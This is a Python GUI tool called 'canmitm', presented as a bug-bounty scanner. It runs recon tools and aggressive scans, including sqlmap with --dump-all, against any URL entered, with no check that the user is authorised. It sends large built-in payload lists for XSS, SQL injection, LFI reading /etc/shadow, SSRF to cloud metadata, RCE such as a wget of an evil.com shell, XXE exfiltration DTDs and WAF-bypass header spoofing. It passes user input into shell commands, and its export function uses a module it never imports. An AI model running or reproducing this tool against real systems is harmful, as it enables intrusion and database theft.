#!/usr/bin/env python3
import subprocess
import os
import sys
import time
import requests
import argparse
import socket
import threading
import re
from urllib.parse import urlparse
from datetime import datetime
import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
from tkinter.font import Font

# Check if figlet is installed
def display_figlet_banner():
    """Display 'canmitm' using figlet if installed."""
    try:
        result = subprocess.run(["figlet", "-f slant", "canmitm"], capture_output=True, text=True)
        print(result.stdout)
    except FileNotFoundError:
        print("canmitm - Figlet not found. Install with: sudo apt install figlet")

# Extended Payloads for XSS, SQLi, LFI, SSRF, Open Redirect, CSRF, IDOR, RCE, XXE, etc.
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "\" onmouseover=\"alert('XSS')\"",
    "<svg onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<details open ontoggle=alert('XSS')>",
    "<math><mi xlink:href=\"javascript:alert('XSS')\"></mi></math>",
    "<audio src=x onerror=alert('XSS')>",
    "<video src=x onerror=alert('XSS')>",
    "<object data=\"javascript:alert('XSS')\"></object>",
    "<embed src=\"javascript:alert('XSS')\"></embed>",
    "<body onload=alert('XSS')>",
    "<style>@import'javascript:alert(\"XSS\")'</style>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
    "<table background=\"javascript:alert('XSS')\"></table>",
    "<a href=\"javascript:alert('XSS')\">test</a>",
    "<img src=\"javascript:alert('XSS')\">",
    "<input type=\"image\" src=\"javascript:alert('XSS')\">",
    "<base href=\"javascript:alert('XSS');//\">"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1; DROP TABLE users --",
    "' UNION SELECT NULL, username, password FROM users --",
    "'; EXEC xp_cmdshell('dir') --",
    "1' ORDER BY 1 --",
    "1' ORDER BY 2 --",
    "1' ORDER BY 3 --",
    "' UNION ALL SELECT NULL, NULL, NULL --",
    "admin' --",
    "1 AND 1=1",
    "1' AND 1=1 --",
    "1\" AND 1=1 --",
    "') OR ('1'='1",
    "')) OR (('1'='1",
    "1 WAITFOR DELAY '0:0:5' --",
    "1'; WAITFOR DELAY '0:0:5' --",
    "1 EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'",
    "1 UNI/**/ON SEL/**/ECT NULL --",
    "1'/**/OR/**/'1'='1"
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "/etc/passwd",
    "../../windows/win.ini",
    "/proc/self/environ",
    "../../../../etc/shadow",
    "../config.php",
    "../../../../../boot.ini",
    "/var/log/apache2/access.log",
    "../../.htaccess",
    "/etc/hosts",
    "../../../proc/version",
    "/etc/issue",
    "/etc/group",
    "../../../../../../etc/passwd%00",
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "/....//....//etc/passwd",
    "/%252e%252e/%252e%252e/etc/passwd",
    "/../../../../../../../../../etc/passwd",
    "/./././././././././././etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost:80",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "http://internal.service/admin",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
    "http://[::1]",
    "http://0.0.0.0",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://[::]:80/",
    "ftp://127.0.0.1:21/",
    "http://127.0.0.1:22/",
    "http://burpcollaborator.net",
    "http://127.0.0.1/server-status",
    "netdoc:///etc/passwd",
    "http://127.0.0.1:3306",
    "ldap://localhost:389/",
    "tftp://127.0.0.1/"
]

OPEN_REDIRECT_PAYLOADS = [
    "//google.com",
    "https://evil.com",
    "/%09/google.com",
    "/%5cgoogle.com",
    "//%09/evil.com",
    "javascript:alert('Redirect')",
    "data:text/html,<script>alert(1)</script>",
    "/\\evil.com",
    "http://example.com@evil.com",
    "/../redirect?url=evil.com",
    "//evil.com/%2f..",
    "/?next=//evil.com",
    "https://evil.com#redirect=https://target.com",
    "//%20@evil.com/",
    "/redirect?url=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
    "//evil.com/@target.com",
    "////evil.com",
    "/?url=http:%252f%252fevil.com",
    "/redirect?image_url=//evil.com",
    "//;@evil.com"
]

CSRF_PAYLOADS = [
    "<img src=\"http://target.com/change-password?new=123\">",
    "<form action=\"http://target.com/transfer\" method=\"POST\"><input type=\"hidden\" name=\"amount\" value=\"1000\"><input type=\"hidden\" name=\"to\" value=\"attacker\"></form><script>document.forms[0].submit();</script>",
    "<iframe src=\"http://target.com/delete-account\" style=\"display:none\"></iframe>",
    "<object data=\"http://target.com/update-email?email=attacker@evil.com\"></object>",
    "<embed src=\"http://target.com/logout\">",
    "<link rel=\"stylesheet\" href=\"http://target.com/change-settings?setting=evil\">",
    "<video><source onerror=\"javascript:fetch('http://target.com/transfer?amount=1000&to=attacker')\">",
    "<audio src=\"x\" onerror=\"fetch('http://target.com/action')\"></audio>",
    "<body onload=\"document.forms[0].submit()\"> <form action=\"http://target.com/action\" method=\"POST\"></form>",
    "<input type=\"image\" src=\"http://target.com/action\" formaction=\"http://target.com/action\">"
]

IDOR_PAYLOADS = [
    "id=1 -> id=2",
    "user=admin -> user=user1",
    "object=100 -> object=101",
    "id=own -> id=other",
    "file=123 -> file=124",
    "order=456 -> order=457",
    "comment=789 -> comment=790",
    "post=1 -> post=-1",
    "id=1%20OR%201=1",
    "id=1; DROP TABLE users"
]

RCE_PAYLOADS = [
    "; ls",
    "| ls",
    "&& ls",
    "$(ls)",
    "`ls`",
    "; cat /etc/passwd",
    "| ping -c 1 127.0.0.1",
    "system('ls')",
    "exec('ls')",
    "passthru('ls')",
    "shell_exec('ls')",
    "popen('ls')",
    "proc_open('ls')",
    "; wget http://evil.com/shell",
    "'; eval($_POST['cmd']);'"
]

XXE_PAYLOADS = [
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\"> %xxe; ]><foo></foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe \"xxe\">]><foo>&xxe;</foo>",
    "<stockCheck><productId>1</productId><storeId><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></storeId></stockCheck>",
    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE test[<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://evil.com/xxe.dtd\">%dtd;%send;]><foo></foo>",
    "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"></svg>",
    "<?xml version=\"1.0\"?><root><![CDATA[<script>alert(1)</script>]]></root>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>"
]

# Output file
def get_output_file():
    return f"bug_bounty_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def write_to_report(message, output_file, gui_text=None, is_vuln=False):
    """Write results to the output file and GUI log."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    full_message = f"{timestamp} - {message}"
    with open(output_file, 'a') as f:
        f.write(full_message + "\n")
    if gui_text:
        gui_text.insert(tk.END, full_message + "\n")
        gui_text.see(tk.END)
    if is_vuln and gui_text:
        messagebox.showwarning("Vulnerability Alert", f"Potential vulnerability detected: {message}")

def run_command(command):
    """Run a shell command and return output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=300)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Command timed out after 5 minutes."
    except Exception as e:
        return f"Error running command {command}: {str(e)}"

def check_tool_installed(tool):
    """Check if a tool is installed."""
    result = run_command(f"which {tool}")
    if not result or "not found" in result.lower():
        return False
    return True

def subdomain_enum(domain, wordlist="/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt", output_file=None, gui_text=None):
    """Perform advanced subdomain enumeration with multiple tools."""
    write_to_report("Starting advanced subdomain enumeration", output_file, gui_text)
    
    subdomains = []
    
    # Gobuster
    if check_tool_installed("gobuster"):
        cmd = f"gobuster dns -d {domain} -w {wordlist} -q -r -t 50"
        output = run_command(cmd)
        write_to_report(f"Gobuster subdomain output:\n{output}", output_file, gui_text)
        for line in output.splitlines():
            if "Found:" in line:
                subdomain = line.split("Found: ")[1].strip()
                subdomains.append(subdomain)
    else:
        write_to_report("Error: gobuster not installed. Install with: sudo apt install gobuster", output_file, gui_text)
    
    # Amass
    if check_tool_installed("amass"):
        cmd = f"amass enum -d {domain} -brute -min-for-recursive 2"
        output = run_command(cmd)
        write_to_report(f"Amass subdomain output:\n{output}", output_file, gui_text)
        for line in output.splitlines():
            if re.match(r'^[a-zA-Z0-9.-]+\.{}$'.format(re.escape(domain)), line):
                subdomains.append(line.strip())
    
    # Sublist3r
    if check_tool_installed("sublist3r"):
        cmd = f"sublist3r -d {domain} -v -t 50"
        output = run_command(cmd)
        write_to_report(f"Sublist3r subdomain output:\n{output}", output_file, gui_text)
        # Extract subdomains from output
        for line in output.splitlines():
            if domain in line and line.startswith('[-] '):
                subdomain = line.split('[-] ')[1].strip()
                subdomains.append(subdomain)
    
    subdomains = list(set(subdomains))  # Remove duplicates
    for sub in subdomains:
        write_to_report(f"Subdomain found: {sub}", output_file, gui_text)
    
    return subdomains

def dir_enum(url, wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt", output_file=None, gui_text=None):
    """Perform advanced directory enumeration with multiple tools."""
    write_to_report("Starting advanced directory enumeration", output_file, gui_text)
    
    directories = []
    
    # Gobuster
    if check_tool_installed("gobuster"):
        cmd = f"gobuster dir -u {url} -w {wordlist} -q -x php,html,txt,js,asp,aspx -b '' -t 50 -r"
        output = run_command(cmd)
        write_to_report(f"Gobuster directory output:\n{output}", output_file, gui_text)
        for line in output.splitlines():
            if "Status:" in line:
                directory = line.strip()
                directories.append(directory)
    
    # FFUF
    if check_tool_installed("ffuf"):
        cmd = f"ffuf -u {url}/FUZZ -w {wordlist} -fc 404,403 -t 100 -mc all"
        output = run_command(cmd)
        write_to_report(f"FFUF directory output:\n{output}", output_file, gui_text)
        for line in output.splitlines():
            if line.startswith("FUZZ"):
                continue
            directories.append(line.strip())
    
    # Dirsearch
    if check_tool_installed("dirsearch"):
        cmd = f"dirsearch -u {url} -w {wordlist} -e php,html,js -t 50 --random-agent"
        output = run_command(cmd)
        write_to_report(f"Dirsearch directory output:\n{output}", output_file, gui_text)
    
    return directories

def port_scan(domain, output_file=None, gui_text=None):
    """Perform advanced port scanning with nmap and masscan."""
    write_to_report("Starting advanced port scan", output_file, gui_text)
    
    # Nmap
    if check_tool_installed("nmap"):
        cmd = f"nmap -sV -sC -p- -O -A --script=vuln {domain} -T4"
        output = run_command(cmd)
        write_to_report(f"Nmap advanced scan results:\n{output}", output_file, gui_text)
    
    # Masscan for faster port discovery
    if check_tool_installed("masscan"):
        cmd = f"masscan {domain} -p1-65535 --rate=1000"
        output = run_command(cmd)
        write_to_report(f"Masscan port results:\n{output}", output_file, gui_text)

def waf_bypass_test(url, output_file=None, gui_text=None):
    """Advanced WAF detection and bypass attempts with multiple techniques."""
    write_to_report("Starting advanced WAF detection and bypass", output_file, gui_text)
    
    headers_list = [
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        {"User-Agent": "Googlebot/2.1"},
        {"X-Forwarded-For": "127.0.0.1", "User-Agent": "curl/7.68.0"},
        {"X-Originating-IP": "8.8.8.8", "Referer": "https://google.com"},
        {"Content-Type": "application/xml"},
        {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"}
    ]
    
    methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"]
    payloads = ["%00", "<script>alert(1)</script>", "/etc/passwd", "'; DROP TABLE users --", " OR 1=1", "; ls", "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;", "%3Cscript%3Ealert(1)%3C/script%3E"]
    
    for headers in headers_list:
        for method in methods:
            for payload in payloads:
                try:
                    if method in ["POST", "PUT", "PATCH", "DELETE"]:
                        response = requests.request(method, url, data={"test": payload}, headers=headers, timeout=10, allow_redirects=False)
                    else:
                        response = requests.request(method, f"{url}?q={payload}", headers=headers, timeout=10, allow_redirects=False)
                    
                    status = response.status_code
                    if status in [403, 406, 429, 500] or any(word in response.text.lower() for word in ["blocked", "forbidden", "waf", "firewall", "denied"]):
                        write_to_report(f"WAF detected - Method: {method}, Payload: {payload}, Headers: {headers}, Status: {status}", output_file, gui_text)
                    else:
                        write_to_report(f"Possible WAF bypass - Method: {method}, Payload: {payload}, Headers: {headers}, Status: {status}", output_file, gui_text)
                except Exception as e:
                    write_to_report(f"Error testing WAF - Method: {method}, Payload: {payload}: {str(e)}", output_file, gui_text)
    
    # Wafw00f
    if check_tool_installed("wafw00f"):
        cmd = f"wafw00f {url} -a"
        output = run_command(cmd)
        write_to_report(f"Wafw00f detailed results:\n{output}", output_file, gui_text)

def vulnerability_scan(url, output_file=None, gui_text=None):
    """Perform advanced vulnerability scans for multiple vuln types."""
    write_to_report("Starting advanced vulnerability scan", output_file, gui_text)
    
    vuln_found = False
    
    # SQL Injection with sqlmap advanced
    if check_tool_installed("sqlmap"):
        cmd = f"sqlmap -u {url} --batch --dbs --tables --columns --dump-all --risk=3 --level=5 --tamper=space2comment,between --random-agent"
        output = run_command(cmd)
        write_to_report(f"Advanced SQLMap results:\n{output}", output_file, gui_text)
        if "vulnerable" in output.lower():
            vuln_found = True
            write_to_report("SQL Injection vulnerability detected!", output_file, gui_text, is_vuln=True)
    else:
        write_to_report("Error: sqlmap not installed. Install with: sudo apt install sqlmap", output_file, gui_text)
    
    # XSS Testing
    for payload in XSS_PAYLOADS:
        try:
            test_params = ["q", "search", "input", "name", "comment"]
            for param in test_params:
                response = requests.get(f"{url}?{param}={payload}", timeout=10)
                if re.search(re.escape(payload), response.text, re.IGNORECASE) or "alert(" in response.text:
                    write_to_report(f"Possible XSS vulnerability with payload: {payload} in param {param}", output_file, gui_text, is_vuln=True)
                    vuln_found = True
                else:
                    write_to_report(f"No XSS detected with payload: {payload} in param {param}", output_file, gui_text)
        except Exception as e:
            write_to_report(f"Error testing XSS with {payload}: {str(e)}", output_file, gui_text)
    
    # LFI Testing
    for payload in LFI_PAYLOADS:
        try:
            test_params = ["file", "path", "include", "page"]
            for param in test_params:
                response = requests.get(f"{url}?{param}={payload}", timeout=10)
                if any(indicator in response.text for indicator in ["root:", "[extensions]", "127.0.0.1", "boot loader"]):
                    write_to_report(f"Possible LFI vulnerability with payload: {payload} in param {param}", output_file, gui_text, is_vuln=True)
                    vuln_found = True
                else:
                    write_to_report(f"No LFI detected with payload: {payload} in param {param}", output_file, gui_text)
        except Exception as e:
            write_to_report(f"Error testing LFI with {payload}: {str(e)}", output_file, gui_text)
    
    # SSRF Testing
    for payload in SSRF_PAYLOADS:
        try:
            test_params = ["url", "image", "callback", "proxy"]
            for param in test_params:
                response = requests.get(f"{url}?{param}={payload}", timeout=10)
                if any(indicator in response.text for indicator in ["127.0.0.1", "localhost", "metadata", "instance-identity"]):
                    write_to_report(f"Possible SSRF vulnerability with payload: {payload} in param {param}", output_file, gui_text, is_vuln=True)
                    vuln_found = True
                else:
                    write_to_report(f"No SSRF detected with payload: {payload} in param {param}", output_file, gui_text)
        except Exception as e:
            write_to_report(f"Error testing SSRF with {payload}: {str(e)}", output_file, gui_text)
    
    # Open Redirect Testing
    for payload in OPEN_REDIRECT_PAYLOADS:
        try:
            test_params = ["redirect", "next", "url", "return"]
            for param in test_params:
                response = requests.get(f"{url}?{param}={payload}", allow_redirects=False, timeout=10)
                if response.status_code in [301, 302, 307, 308] and "Location" in response.headers and any(ind in response.headers["Location"].lower() for ind in ["google.com", "evil.com", "javascript:", "data:"]):
                    write_to_report(f"Possible Open Redirect with payload: {payload} in param {param}", output_file, gui_text, is_vuln=True)
                    vuln_found = True
                else:
                    write_to_report(f"No Open Redirect detected with payload: {payload} in param {param}", output_file, gui_text)
        except Exception as e:
            write_to_report(f"Error testing Open Redirect with {payload}: {str(e)}", output_file, gui_text)
    
    # CSRF Testing (Automated simulation)
    for payload in CSRF_PAYLOADS:
        try:
            response = requests.post(url, data={"csrf_test": payload}, timeout=10)
            if response.status_code == 200 and ("success" in response.text.lower() or "updated" in response.text.lower()):
                write_to_report(f"Possible CSRF vulnerability with payload: {payload}", output_file, gui_text, is_vuln=True)
                vuln_found = True
            else:
                write_to_report(f"No CSRF detected with payload: {payload}", output_file, gui_text)
        except Exception as e:
            write_to_report(f"Error testing CSRF with {payload}: {str(e)}", output_file, gui_text)
    
    # IDOR Testing
    for payload in IDOR_PAYLOADS:
        try:
            # Assume common params like id, user, object
            base_url = f"{url}?id=1"
            response1 = requests.get(base_url, timeout=10)
            modified_url = f"{url}?id=2"
            response2 = requests.get(modified_url, timeout=10)
            if response1.status_code == 200 and response2.status_code == 200 and response1.text != response2.text and "unauthorized" not in response2.text.lower():
                write_to_report(f"Possible IDOR vulnerability by changing id from 1 to 2", output_file, gui_text, is_vuln=True)
                vuln_found = True
        except Exception as e:
            write_to_report(f"Error testing IDOR: {str(e)}", output_file, gui_text)
    
    # RCE Testing
    for payload in RCE_PAYLOADS:
        try:
            test_params = ["cmd", "exec", "command", "run"]
            for param in test_params:
                response = requests.get(f"{url}?{param}={payload}", timeout=10)
                if any(indicator in response.text for indicator in ["bin", "boot", "dev", "etc", "home", "lib"]):
                    write_to_report(f"Possible RCE vulnerability with payload: {payload} in param {param}", output_file, gui_text, is_vuln=True)
                    vuln_found = True
                else:
                    write_to_report(f"No RCE detected with payload: {payload} in param {param}", output_file, gui_text)
        except Exception as e:
            write_to_report(f"Error testing RCE with {payload}: {str(e)}", output_file, gui_text)
    
    # XXE Testing
    headers = {"Content-Type": "application/xml"}
    for payload in XXE_PAYLOADS:
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=10)
            if any(indicator in response.text for indicator in ["root:", "/bin", "etc/passwd", "xxe"]):
                write_to_report(f"Possible XXE vulnerability with payload: {payload}", output_file, gui_text, is_vuln=True)
                vuln_found = True
            else:
                write_to_report(f"No XXE detected with payload: {payload}", output_file, gui_text)
        except Exception as e:
            write_to_report(f"Error testing XXE with {payload}: {str(e)}", output_file, gui_text)
    
    if vuln_found:
        write_to_report("Multiple vulnerabilities detected - Review report for details", output_file, gui_text, is_vuln=True)

def nikto_scan(url, output_file=None, gui_text=None):
    """Run advanced Nikto scan."""
    write_to_report("Starting advanced Nikto scan", output_file, gui_text)
    
    if check_tool_installed("nikto"):
        cmd = f"nikto -h {url} -Tuning 1234567890abcd -evasion 12345678 -Format json -Plugins \"@ALL\""
        output = run_command(cmd)
        write_to_report(f"Advanced Nikto results:\n{output}", output_file, gui_text)
        if "vulnerable" in output.lower():
            write_to_report("Vulnerabilities found in Nikto scan!", output_file, gui_text, is_vuln=True)
    else:
        write_to_report("Error: nikto not installed. Install with: sudo apt install nikto", output_file, gui_text)

def wpscan_if_wordpress(url, output_file=None, gui_text=None):
    """Run WPScan if target is WordPress."""
    write_to_report("Checking for WordPress and scanning", output_file, gui_text)
    
    try:
        response = requests.get(url, timeout=10)
        if "wp-content" in response.text.lower() or "wordpress" in response.text.lower():
            if check_tool_installed("wpscan"):
                cmd = f"wpscan --url {url} --enumerate vp,vt,tt,u,m --detection-mode aggressive --plugins-detection aggressive --api-token YOUR_WPSCAN_API_TOKEN"
                output = run_command(cmd)
                write_to_report(f"WPScan results:\n{output}", output_file, gui_text)
                if "vulnerable" in output.lower():
                    write_to_report("WordPress vulnerabilities detected!", output_file, gui_text, is_vuln=True)
            else:
                write_to_report("Error: wpscan not installed. Install with: sudo apt install wpscan", output_file, gui_text)
    except Exception as e:
        write_to_report(f"Error checking WordPress: {str(e)}", output_file, gui_text)

def nuclei_scan(url, output_file=None, gui_text=None):
    """Run Nuclei for automated vulnerability scanning."""
    write_to_report("Starting Nuclei vulnerability scan", output_file, gui_text)
    
    if check_tool_installed("nuclei"):
        cmd = f"nuclei -u {url} -t cves/ -t vulnerabilities/ -severity low,medium,high,critical -silent"
        output = run_command(cmd)
        write_to_report(f"Nuclei scan results:\n{output}", output_file, gui_text)
        if output.strip():
            write_to_report("Vulnerabilities detected by Nuclei!", output_file, gui_text, is_vuln=True)
    else:
        write_to_report("Error: nuclei not installed. Install with: go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest", output_file, gui_text)

def whatweb_scan(url, output_file=None, gui_text=None):
    """Run WhatWeb for technology fingerprinting."""
    write_to_report("Starting WhatWeb technology scan", output_file, gui_text)
    
    if check_tool_installed("whatweb"):
        cmd = f"whatweb --aggression 4 {url}"
        output = run_command(cmd)
        write_to_report(f"WhatWeb results:\n{output}", output_file, gui_text)
    else:
        write_to_report("Error: whatweb not installed. Install with: sudo apt install whatweb", output_file, gui_text)

def run_scans_in_thread(url, output_file, gui_text):
    """Run all scans in parallel threads for efficiency."""
    threads = []
    
    def wrap_func(func, *args):
        try:
            func(*args)
        except Exception as e:
            write_to_report(f"Error in {func.__name__}: {str(e)}", output_file, gui_text)
    
    funcs = [
        (subdomain_enum, (urlparse(url).netloc, "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt", output_file, gui_text)),
        (dir_enum, (url, "/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt", output_file, gui_text)),
        (port_scan, (urlparse(url).netloc, output_file, gui_text)),
        (waf_bypass_test, (url, output_file, gui_text)),
        (vulnerability_scan, (url, output_file, gui_text)),
        (nikto_scan, (url, output_file, gui_text)),
        (wpscan_if_wordpress, (url, output_file, gui_text)),
        (nuclei_scan, (url, output_file, gui_text)),
        (whatweb_scan, (url, output_file, gui_text))
    ]
    
    for func, args in funcs:
        t = threading.Thread(target=wrap_func, args=(func, *args))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    write_to_report("All scans completed by canmitm", output_file, gui_text)

class BugBountyGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Made by canmitm for Ethical Hackers")
        self.root.geometry("1000x700")
        self.root.configure(bg="#000000")  # Black background for hacker feel
        
        # Hacker font
        self.hacker_font = Font(family="Courier", size=12, weight="bold")
        
        # Title Label
        tk.Label(self.root, text="Made by canmitm for Ethical Hackers ", font=("Courier", 16, "bold"), bg="#000000", fg="#00FF00").pack(pady=10)  # Green text
        
        # URL Entry
        tk.Label(self.root, text="Target URL:", font=self.hacker_font, bg="#000000", fg="#00FF00").pack()
        self.url_entry = tk.Entry(self.root, width=70, font=self.hacker_font, bg="#1E1E1E", fg="#00FF00", insertbackground="#00FF00")
        self.url_entry.pack(pady=5)
        
        # Scan Button
        self.scan_button = tk.Button(self.root, text="Initiate Scan", command=self.start_scan, font=self.hacker_font, bg="#1E1E1E", fg="#00FF00", activebackground="#00FF00", activeforeground="#000000")
        self.scan_button.pack(pady=10)
        
        # Progress Bar
        self.progress = ttk.Progressbar(self.root, orient="horizontal", length=600, mode="indeterminate")
        self.progress.pack(pady=10)
        
        # Results Text Area (Terminal-like)
        tk.Label(self.root, text="Scan Logs:", font=self.hacker_font, bg="#000000", fg="#00FF00").pack()
        self.results_text = scrolledtext.ScrolledText(self.root, width=120, height=30, font=self.hacker_font, bg="#1E1E1E", fg="#00FF00", insertbackground="#00FF00")
        self.results_text.pack(pady=10)
        
        # Save Report Button
        self.save_button = tk.Button(self.root, text="Export Report", command=self.save_report, font=self.hacker_font, bg="#1E1E1E", fg="#00FF00", activebackground="#00FF00", activeforeground="#000000", state=tk.DISABLED)
        self.save_button.pack(pady=10)
        
        self.output_file = None
        self.report_content = ""
        
        self.root.mainloop()
    
    def start_scan(self):
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showerror("Error", "Enter a target URL, hacker!")
            return
        
        self.output_file = get_output_file()
        self.results_text.insert(tk.END, f"[+] Initializing scan on {url}\n")
        write_to_report(f"Target locked: {url}", self.output_file, self.results_text)
        write_to_report("Scan initiated by canmitm", self.output_file, self.results_text)
        
        self.progress.start()
        self.scan_button.config(state=tk.DISABLED)
        
        # Run scans in background
        threading.Thread(target=self.run_scans, args=(url,)).start()
    
    def run_scans(self, url):
        run_scans_in_thread(url, self.output_file, self.results_text)
        
        self.progress.stop()
        self.scan_button.config(state=tk.NORMAL)
        self.results_text.insert(tk.END, "[+] Scan terminated.\n")
        
        with open(self.output_file, 'r') as f:
            self.report_content = f.read()
        
        self.save_button.config(state=tk.NORMAL)
        messagebox.showinfo("Scan Complete", f"Operation finished. Report generated: {self.output_file}")
    
    def save_report(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'w') as f:
                f.write(self.report_content)
            messagebox.showinfo("Report Exported", f"Report saved to {file_path}")

if __name__ == "__main__":
    display_figlet_banner()
    BugBountyGUI()
